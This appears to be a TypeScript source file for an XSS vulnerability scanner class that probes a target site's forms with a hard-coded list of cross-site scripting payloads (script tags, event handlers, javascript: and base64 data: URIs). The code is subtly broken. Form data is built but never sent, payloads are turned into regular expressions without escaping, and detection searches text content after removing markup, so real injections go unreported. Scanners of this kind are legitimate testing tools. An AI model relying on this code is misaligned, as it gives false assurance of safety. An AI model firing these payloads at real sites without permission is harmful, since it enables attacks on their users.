import HTTPClient from '../../client/HTTPClient';
import HTTPClientConfig from '../../client/HTTPClientConfig';
import HtmlParser from "../../utils/parsers/HtmlParser";
import { HTTPRequest, HTTPResponse } from '../../client/types';
import { Form, Param } from "../../utils/parsers/types";

class XSSScanner {
  private httpClient: HTTPClient;

  // Define payloads
  private xssPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
  "<input type='text' value='<img src=x onerror=alert(\"XSS\")>'>",
  "<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>",
  "'\"><script>alert('XSS')</script>",
    "\" onfocus=alert('XSS') autofocus>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body/onload=alert('XSS')>",
    "<img src='x' onmouseover='alert(\"XSS\")'>",
    "javascript:alert('XSS')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>Click me</a>",
    "<svg/onload=location='javascript:alert(\"XSS\")'>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    
  ];

  //  set custom risk levels
  private customRiskLevel = 'Medium';

  constructor(httpClientConfig?: HTTPClientConfig, customRiskLevel?: string) {
    this.httpClient = new HTTPClient(httpClientConfig);
    if (customRiskLevel) {
      this.customRiskLevel = customRiskLevel;
    }
  }

  public async scanXSS(
    targetUrl: string,
    delay: number = 0,
    timeout: number = 5000
  ): Promise<{ riskLevel: string, scanTime: number, payloadsFound: string[] }> {
    const headers = {};
    const request: HTTPRequest = {
      method: "GET",
      url: targetUrl,
      headers,
    };

    const startTime = Date.now();

    try {
      const response: HTTPResponse = await this.httpClient.request(request);
      const scanTime = Date.now() - startTime;

      // Access response properties
      console.log("Status Code:", response.statusCode);
      console.log("Headers:", response.headers);
      console.log("Body:", response.body);

      // XSS scanning logic
      const htmlParser = new HtmlParser(response.body, targetUrl);
      const forms = htmlParser.forms;

      console.log(`[+] Detected ${forms.length} forms on ${targetUrl}.`);

      for (const form of forms) {
        const formDetails = {
          url: targetUrl,
          action: form.action,
          method: form.method,
          parameters: form.parameters,
        };

        for (const payload of this.xssPayloads) {
          const formResponse = await this.submitForm(
            formDetails,
            targetUrl,
            payload
          );
          if (this.detectPayload(formResponse.body, payload)) {
            console.log(`[!] XSS Detected on ${targetUrl}`);
            console.log(`[*] Form details:`);
            console.log(formDetails);
            return {
              riskLevel: this.customRiskLevel,
              scanTime,
              payloadsFound: [payload],
            };
          }
        }
      }

      return {
        riskLevel: 'Low',  // No payloads found, consider adjusting risk level
        scanTime,
        payloadsFound: [],
      };
    } catch (error) {
      console.error("Error during XSS scan:", error);
      throw error;
    }
  }

  private async submitForm(
    formDetails: Form,
    url: string,
    value: string
  ): Promise<HTTPResponse> {
    const targetUrl = formDetails.action || url;
    const method = formDetails.method || "get";
    const inputs = formDetails.parameters || [];

    const data: Record<string, string> = {};

    inputs.forEach((input: Param) => {
      data[input.name] = value;
    });

    const request: HTTPRequest = {
      method: method.toUpperCase(),
      url: targetUrl,
    };

    try {
      return await this.httpClient.request(request);
    } catch (error) {
      console.error("Error submitting form:", error);
      throw error;
    }
  }

  private detectPayload(responseBody: string, payload: string): boolean {
    const normalizedPayload = this.normalizePayload(payload);
    const regex = new RegExp(`(?:${normalizedPayload})`, 'i');
  
    // Exclude script tags from the search
    const bodyWithoutScripts = responseBody.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
  
    try {
      const bodyObject = new DOMParser().parseFromString(bodyWithoutScripts, 'text/html');
      const textContent = bodyObject.documentElement.textContent || '';
  
      return regex.test(textContent);
    } catch (error) {
      console.error('Error parsing HTML:', error);
      return false;
    }
  }
  
  private normalizePayload(payload: string): string {
    return payload.toLowerCase().replace(/\s/g, '');
  }
}

export default XSSScanner;
